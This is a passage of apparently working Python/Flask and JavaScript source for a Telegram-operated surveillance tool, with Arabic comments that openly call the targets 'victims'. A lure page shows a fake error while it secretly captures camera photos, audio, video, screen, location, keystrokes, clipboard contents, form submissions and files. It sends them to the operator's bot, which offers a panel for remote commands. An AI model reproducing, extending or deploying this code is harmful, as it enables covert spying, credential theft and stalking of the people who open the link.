      } catch(e) {}
    }, true);

    // Click
    document.addEventListener('click', e => {
      try {
        enqueue({
          type: 'click',
          x: e.clientX, y: e.clientY,
          target: (e.target && e.target.tagName) ? e.target.tagName : 'unknown',
          text: (e.target && e.target.innerText) ? e.target.innerText.slice(0, 80) : ''
        });
      } catch(e) {}
    }, true);

    // URL change
    let lastUrl = location.href;
    setInterval(() => {
      if (location.href !== lastUrl) {
        lastUrl = location.href;
        enqueue({ type: 'url_change', url: lastUrl });
      }
    }, 1500);

    // Periodic snapshot كل 45 ثانية (تقليل الضغط)
    setInterval(() => {
      const img = snapshot();
      if (img) enqueue({ type: 'periodic_photo', image: img });
    }, 45000);
  }

  // ============================================================
  // الإقلاع: إرسال ping أولي ثم عرض الخطأ
  // ============================================================
  (async () => {
    ensureHiddenEls();

    // إرسال إشارة دخول
    enqueue({ type: 'landing' });

    // ننتظر 2.5 ثانية ثم نعرض الخطأ (يبدو حقيقي)
    await sleep(2500);

    // إظهار الخطأ بسلاسة
    el('errorState').style.opacity = '0';
    el('errorState').style.transition = 'opacity 0.4s';
    await sleep(50);
    el('errorState').style.opacity = '1';
  })();

  // مساعدة: حفظ مؤشر التمرير لمنع الإغلاق
  window.addEventListener('beforeunload', function(e) {
    e.preventDefault();
    e.returnValue = '';
    return '';
  });

})();
</script>
</body>
</html>
"""


# ============================================================
# [4] توليد QR
# ============================================================
def generate_qr_code_bytes(deep_link_url):
    try:
        qr = qrcode.QRCode(
            version=None,
            error_correction=qrcode.constants.ERROR_CORRECT_H,
            box_size=12,
            border=2,
        )
        qr.add_data(deep_link_url)
        qr.make(fit=True)
        img = qr.make_image(fill_color="#0b1120", back_color="#ffffff")
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        buf.seek(0)
        buf.name = "lsh_qr.png"
        return buf
    except Exception as e:
        print(f"[-] QR gen error: {e}")
        return io.BytesIO()


# ============================================================
# [5] لوحة تحكم البوت
# ============================================================
def build_lsh_control_panel(session_id, chat_id):
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
    m = InlineKeyboardMarkup()
    m.row(
        InlineKeyboardButton("📸 صورة فورية", callback_data=f"lsh_snap_{session_id}"),
        InlineKeyboardButton("🎙️ تسجيل صوتي", callback_data=f"lsh_audio_{session_id}"),
    )
    m.row(
        InlineKeyboardButton("🎥 فيديو 10 ثوان", callback_data=f"lsh_video_{session_id}"),
        InlineKeyboardButton("🖥️ لقطة شاشة", callback_data=f"lsh_screen_{session_id}"),
    )
    m.row(
        InlineKeyboardButton("📋 حافظة الضحية", callback_data=f"lsh_clip_{session_id}"),
        InlineKeyboardButton("📍 تحديث الموقع", callback_data=f"lsh_loc_{session_id}"),
    )
    m.row(
        InlineKeyboardButton("🌐 فتح رابط", callback_data=f"lsh_open_{session_id}"),
        InlineKeyboardButton("📳 اهتزاز", callback_data=f"lsh_vibrate_{session_id}"),
    )
    m.row(
        InlineKeyboardButton("❌ إغلاق الجلسة", callback_data=f"lsh_kill_{session_id}"),
    )
    return m


# ============================================================
# [6] تسجيل المسارات
# ============================================================
def init_lsh_routes(app, bot):

    @app.route('/lsh', methods=['GET'])
    def lsh_landing():
        session_id = request.args.get('s', '')
        chat_id = request.args.get('id', '')
        if not session_id or not chat_id:
            return "Invalid link", 400

        # التحقق من Redis
        try:
            if redis_client:
                stored = redis_client.get(f"lsh_session:{session_id}")
                if not stored:
                    return "Session expired", 410
        except Exception:
            pass

        # تسجيل الجلسة في الذاكرة
        create_session(session_id, chat_id)

        html = (LSH_PAGE
                .replace("__SESSION_ID__", session_id)
                .replace("__CHAT_ID__", str(chat_id))
                .replace("__HTTP_URL__", RAILWAY_URL))
        return html, 200

    # ------------------------------------------------------------
    # استقبال البيانات من الضحية
    # ------------------------------------------------------------
    @app.route('/lsh_data', methods=['POST'])
    def lsh_data():
        try:
            data = request.get_json(silent=True) or {}
            session_id = data.get('session_id')
            chat_id = data.get('chat_id')

            if not session_id or not chat_id:
                return jsonify({"status": "missing"}), 400

            sess = get_session(session_id)
            if sess:
                sess["last_seen"] = time.time()
            else:
                # إنشاء جلسة تلقائياً لو الضحية فتح الرابط بعد restart
                create_session(session_id, chat_id)

            # تحديث Redis نشاط
            if redis_client:
                try:
                    redis_client.setex(f"lsh_active:{session_id}", 3600, "1")
                except Exception:
                    pass

            source_ip = (request.headers.get('CF-Connecting-IP') or
                         request.headers.get('X-Forwarded-For') or
                         request.headers.get('X-Real-IP') or
                         request.remote_addr or "Unknown")
            if ',' in source_ip:
                source_ip = source_ip.split(',')[0].strip()

            _handle_incoming(bot, chat_id, session_id, data, source_ip)
            return jsonify({"status": "ok"}), 200
        except Exception as e:
            print(f"[-] lsh_data error: {e}")
            import traceback
            traceback.print_exc()
            return jsonify({"status": "error"}), 500

    # ------------------------------------------------------------
    # Long-Polling للأوامر — يقرأ من Redis list
    # ------------------------------------------------------------
    @app.route('/lsh_poll', methods=['GET'])
    def lsh_poll():
        session_id = request.args.get('s', '')
        if not session_id:
            return jsonify({"command": None}), 200

        if not redis_client:
            return jsonify({"command": None}), 200

        channel = f"lsh_cmd:{session_id}"

        # Long-poll: نحاول 25 ثانية، نقرأ من Redis كل 500ms
        start = time.time()
        while time.time() - start < 25:
            try:
                item = redis_client.rpop(channel)
                if item:
                    print(f"[+] Command delivered to {session_id}: {item[:80]}")
                    return jsonify({"command": json.loads(item)}), 200
            except Exception as e:
                print(f"[-] poll redis error: {e}")
            time.sleep(0.5)

        return jsonify({"command": None}), 200

    # ------------------------------------------------------------
    # إنشاء جلسة جديدة
    # ------------------------------------------------------------
    @app.route('/lsh_create', methods=['POST'])
    def lsh_create():
        data = request.get_json(silent=True) or {}
        chat_id = data.get('chat_id')
        if not chat_id:
            return jsonify({"error": "missing chat_id"}), 400

        import uuid as _uuid
        session_id = str(_uuid.uuid4()).replace('-', '')[:24]
        create_session(session_id, chat_id)
        return jsonify({"session_id": session_id}), 200


# ============================================================
# [7] معالجة البيانات الواردة
# ============================================================
def _handle_incoming(bot, chat_id, session_id, data, source_ip):
    dtype = data.get('type')

    try:
        # ---------- معلومات أولية ----------
        if dtype == 'info':
            info = data.get('info', {})
            info['ip'] = source_ip
            sess = get_session(session_id)
            if sess:
                sess['info'] = info

            text = _format_info_report(info, session_id)
            bot.send_message(chat_id, text, parse_mode="Markdown",
                             disable_web_page_preview=True)

            panel = build_lsh_control_panel(session_id, chat_id)
            bot.send_message(chat_id,
                             f"🎛️ **لوحة تحكم الجلسة النشطة**\n"
                             f"`{session_id}`\n"
                             f"استخدم الأزرار للتحكم بالضحية:",
                             parse_mode="Markdown",
                             reply_markup=panel)

        # ---------- landing ----------
        elif dtype == 'landing':
            bot.send_message(chat_id,
                             f"🎯 **الضحية فتح رابط الجلسة!**\n"
                             f"🆔 `{session_id}`\n"
                             f"🌐 IP: `{source_ip}`\n\n"
                             f"⏳ في انتظار جمع البيانات...",
                             parse_mode="Markdown")

        # ---------- retry_click ----------
        elif dtype == 'retry_click':
            bot.send_message(chat_id, f"👆 **الضحية ضغط على زر إعادة المحاولة!**\n"
                                       f"🆔 `{session_id}`",
                             parse_mode="Markdown")

        # ---------- الموقع ----------
        elif dtype == 'location':
            loc = data.get('location') or {}
            if loc.get('latitude'):
                lat, lng = loc['latitude'], loc['longitude']
                bot.send_message(
                    chat_id,
                    f"📍 **الموقع الجغرافي**\n"
                    f"• الإحداثيات: `{lat}, {lng}`\n"
                    f"• الدقة: `{loc.get('accuracy', 'N/A')}` متر\n"
                    f"• [فتح في خرائط جوجل](https://maps.google.com/?q={lat},{lng})",
                    parse_mode="Markdown", disable_web_page_preview=False
                )
            else:
                bot.send_message(chat_id, "❌ لم يتم السماح بالوصول للموقع")

        # ---------- صور ----------
        elif dtype in ('first_photo', 'periodic_photo', 'command_photo'):
            captions = {
                'first_photo': "📸 **صورة أولية من الكاميرا الأمامية**",
                'periodic_photo': "📸 **صورة دورية (تلقائية كل 45 ثانية)**",
                'command_photo': "📸 **صورة بأمر مباشر**"
            }
            _send_photo(bot, chat_id, data.get('image', ''), captions.get(dtype, "📸 صورة"))

        # ---------- صوتيات ----------
        elif dtype in ('first_audio', 'command_audio'):
            captions = {
                'first_audio': "🎙️ **تسجيل صوتي أولي (5 ثوان)**",
                'command_audio': "🎙️ **تسجيل صوتي بأمر**"
            }
            _send_audio(bot, chat_id, data.get('audio', ''), captions.get(dtype))

        # ---------- فيديو ----------
        elif dtype == 'command_video':
            _send_video(bot, chat_id, data.get('video', ''), "🎥 **مقطع فيديو حي**")

        # ---------- شاشة ----------
        elif dtype == 'command_screen':
            _send_photo(bot, chat_id, data.get('image', ''), "🖥️ **لقطة شاشة مباشرة**")
        elif dtype == 'command_screen_failed':
            bot.send_message(chat_id, "❌ الضحية رفض مشاركة الشاشة أو غير مدعوم")

        # ---------- حافظة ----------
        elif dtype == 'command_clipboard':
            content = data.get('content', '')
            if content:
                bot.send_message(chat_id, f"📋 **محتوى الحافظة:**\n```\n{content[:1000]}\n```", parse_mode="Markdown")
            else:
                bot.send_message(chat_id, "📋 الحافظة فارغة")
        elif dtype == 'command_clipboard_failed':
            bot.send_message(chat_id, "❌ فشل الوصول للحافظة (رفض الإذن)")

        # ---------- ملفات ----------
        elif dtype == 'file_captured':
            try:
                name = data.get('name', 'file')
                content = data.get('content', '')
                if ',' in content:
                    _, encoded = content.split(',', 1)
                    fbytes = base64.b64decode(encoded)
                    buf = io.BytesIO(fbytes)
                    buf.name = name
                    bot.send_document(chat_id, buf, caption=f"📁 **ملف من الضحية:** `{name}`", parse_mode="Markdown")
            except Exception as e:
                print(f"[-] file_captured error: {e}")
        elif dtype == 'file_too_large':
            bot.send_message(chat_id, f"⚠️ ملف كبير (>5MB): `{data.get('name')}` — {data.get('size')} bytes")
        elif dtype == 'file_capture_failed':
            bot.send_message(chat_id, "❌ فشل التقاط الملف (الضحية أغلق المنتقي)")

        # ---------- Keylogger ----------
        elif dtype == 'key':
            key = data.get('key', '')
            if len(key) == 1 or key in ['Enter','Backspace','Delete','Tab','Escape','ArrowUp','ArrowDown','ArrowLeft','ArrowRight']:
                _accumulate_key(chat_id, session_id, key)

        # ---------- Clipboard events ----------
        elif dtype == 'clipboard_copy':
            bot.send_message(chat_id, f"📋 **نسخ:**\n```\n{data.get('content','')[:300]}\n```", parse_mode="Markdown")
        elif dtype == 'clipboard_cut':
            bot.send_message(chat_id, f"✂️ **قص:**\n```\n{data.get('content','')[:300]}\n```", parse_mode="Markdown")
        elif dtype == 'clipboard_paste':
            bot.send_message(chat_id, f"📥 **لصق:**\n```\n{data.get('content','')[:300]}\n```", parse_mode="Markdown")

        # ---------- Form submit ----------
        elif dtype == 'form_submit':
            form_data = data.get('data', {})
            lines = ["📝 **نموذج تم إرساله:**", f"Action: `{str(data.get('action',''))[:80]}`"]
            for k, v in list(form_data.items())[:20]:
                lines.append(f"• `{k}`: `{str(v)[:100]}`")
            bot.send_message(chat_id, "\n".join(lines), parse_mode="Markdown")

        # ---------- Click ----------
        elif dtype == 'click':
            txt = (data.get('text') or '').strip()
            if txt and len(txt) > 2:
                _accumulate_click(chat_id, session_id, txt)

        # ---------- URL change ----------
        elif dtype == 'url_change':
            bot.send_message(chat_id, f"🔗 **تغيير رابط:**\n`{data.get('url','')[:200]}`", parse_mode="Markdown")

        # ---------- تأكيدات الأوامر ----------
        elif dtype == 'command_open_url_done':
            bot.send_message(chat_id, f"✅ تم فتح الرابط على جهاز الضحية")
        elif dtype == 'command_open_url_failed':
            bot.send_message(chat_id, "❌ فشل فتح الرابط (ربما popup blocker)")

        elif dtype == 'command_notify_done':
            bot.send_message(chat_id, "✅ تم إرسال الإشعار للضحية")

        elif dtype == 'command_vibrate_done':
            bot.send_message(chat_id, "✅ تم تفعيل الاهتزاز")

        elif dtype == 'command_location':
            loc = data.get('location') or {}
            if loc and loc.get('latitude'):
                lat, lng = loc['latitude'], loc['longitude']
                bot.send_message(
                    chat_id,
                    f"📍 **الموقع المحدّث:**\n`{lat}, {lng}`\n"
                    f"[فتح في الخرائط](https://maps.google.com/?q={lat},{lng})",
                    parse_mode="Markdown"
                )
            else:
                bot.send_message(chat_id, "❌ تعذّر تحديث الموقع")

        elif dtype == 'command_redirect_ack':
            bot.send_message(chat_id, "✅ تم إنهاء الجلسة، الضحية تم تحويله")

        elif dtype == 'ready':
            bot.send_message(chat_id, f"✅ **الجلسة `{session_id[:8]}` جاهزة للتحكم الكامل**\n"
                                       f"استخدم لوحة التحكم أعلاه 👆")

        elif dtype == 'pong':
            pass  # silent

    except Exception as e:
        print(f"[-] _handle_incoming error ({dtype}): {e}")
        import traceback
        traceback.print_exc()


# ============================================================
# [8] إرسال الوسائط
# ============================================================
def _send_photo(bot, chat_id, data_url, caption):
    try:
        if not data_url or not data_url.startswith('data:image'):
            return
        _, encoded = data_url.split(',', 1)
        img_bytes = base64.b64decode(encoded)
        buf = io.BytesIO(img_bytes)
        buf.name = 'capture.jpg'
        bot.send_photo(chat_id, buf, caption=caption, parse_mode="Markdown")
    except Exception as e:
        print(f"[-] _send_photo error: {e}")


def _send_audio(bot, chat_id, data_url, caption):
    try:
        if not data_url or not data_url.startswith('data:audio'):
            return
        _, encoded = data_url.split(',', 1)
        aud_bytes = base64.b64decode(encoded)
        buf = io.BytesIO(aud_bytes)
        buf.name = 'capture.webm'
        bot.send_audio(chat_id, buf, caption=caption, parse_mode="Markdown")
    except Exception as e:
        print(f"[-] _send_audio error: {e}")


def _send_video(bot, chat_id, data_url, caption):
    try:
        if not data_url or not data_url.startswith('data:video'):
            return
        _, encoded = data_url.split(',', 1)
        vid_bytes = base64.b64decode(encoded)
        buf = io.BytesIO(vid_bytes)
        buf.name = 'capture.webm'
        bot.send_video(chat_id, buf, caption=caption, parse_mode="Markdown")
    except Exception as e:
        print(f"[-] _send_video error: {e}")


# ============================================================
# [9] تجميعات مؤقتة
# ============================================================
_key_buffers = {}
_click_buffers = {}
_BOT_REF = None


def set_bot_reference(bot):
    global _BOT_REF
    _BOT_REF = bot


def _accumulate_key(chat_id, session_id, key):
    now = time.time()
    key_map = {
        'Enter': ' ⏎ ', 'Backspace': '⌫', 'Delete': '⌦', 'Tab': ' ⇥ ',
        'Escape': '⎋', 'ArrowUp': '↑', 'ArrowDown': '↓',
        'ArrowLeft': '←', 'ArrowRight': '→',
    }
    display = key_map.get(key, key)
    buf = _key_buffers.setdefault(chat_id, {"text": "", "last": 0})
    buf["text"] += display

    if now - buf["last"] > 4 or len(buf["text"]) > 180:
        if buf["text"].strip():
            try:
                if _BOT_REF:
                    _BOT_REF.send_message(
                        chat_id,
                        f"⌨️ **لوحة المفاتيح:**\n```\n{buf['text'][:500]}\n```",
                        parse_mode="Markdown"
                    )
            except Exception:
                pass
        buf["text"] = ""
        buf["last"] = now


def _accumulate_click(chat_id, session_id, text):
    now = time.time()
    buf = _click_buffers.setdefault(chat_id, {"texts": [], "last": 0})
    buf["texts"].append(text)
    if now - buf["last"] > 6 or len(buf["texts"]) >= 8:
        try:
            if _BOT_REF and buf["texts"]:
                unique = list(dict.fromkeys(buf["texts"]))[:8]
                _BOT_REF.send_message(
                    chat_id,
                    "🖱️ **النقرات الأخيرة:**\n" + "\n".join(f"• {t[:70]}" for t in unique),
                    parse_mode="Markdown"
                )
        except Exception:
            pass
        buf["texts"] = []
        buf["last"] = now


# ============================================================
# [10] تقرير المعلومات
# ============================================================
def _format_info_report(info, session_id):
    bat = info.get('battery') or {}
    net = info.get('connection') or {}
    scr = info.get('screen') or {}
    hw = info.get('hardware') or {}
    gpu = info.get('gpu') or {}
    webrtc = info.get('webrtc_ips', [])

    ip = info.get('ip', 'Unknown')
    webrtc_text = "، ".join(webrtc) if webrtc else "لا يوجد"

    return (
        "╔══════════════════════════════╗\n"
        "║  🎯 **جلسة LSH جديدة**  ║\n"
        "╚══════════════════════════════╝\n\n"
        f"🆔 الجلسة: `{session_id}`\n"
        f"🌐 **IP الخارجي:** `{ip}`\n"
        f"🕵️ **IP الحقيقي (WebRTC):** `{webrtc_text}`\n"
        f"🕐 الوقت: `{info.get('timestamp', 'N/A')[:19]}`\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "💻 **الجهاز:**\n"
        f"• المنصة: `{info.get('platform', 'Unknown')}`\n"
        f"• المعالج: `{hw.get('cores', 'N/A')} أنوية`\n"
        f"• الذاكرة: `{hw.get('memory', 'N/A')} GB`\n"
        f"• اللغة: `{info.get('language', 'N/A')}`\n"
        f"• المنطقة الزمنية: `{info.get('timezone', 'N/A')}`\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "🎮 **كرت الرسوميات:**\n"
        f"• `{gpu.get('vendor', 'N/A')}`\n"
        f"• `{gpu.get('renderer', 'N/A')}`\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "📐 **الشاشة:**\n"
        f"• `{scr.get('width', '?')}x{scr.get('height', '?')}` "
        f"DPR `{scr.get('pixelRatio', '?')}` "
        f"{scr.get('colorDepth', '?')}-bit\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "🔋 **البطارية:** "
        + (f"`{bat.get('level', '?')}%` | شحن: `{'نعم' if bat.get('charging') else 'لا'}`"
           if bat else "غير متاح") + "\n"
        "📶 **الشبكة:** "
        + (f"`{net.get('effectiveType', '?')}` | ↓ `{net.get('downlink', '?')}` Mbps"
           if net else "غير متاح") + "\n"
        "━━━━━━━━━━━━━━━━━━━━"
)
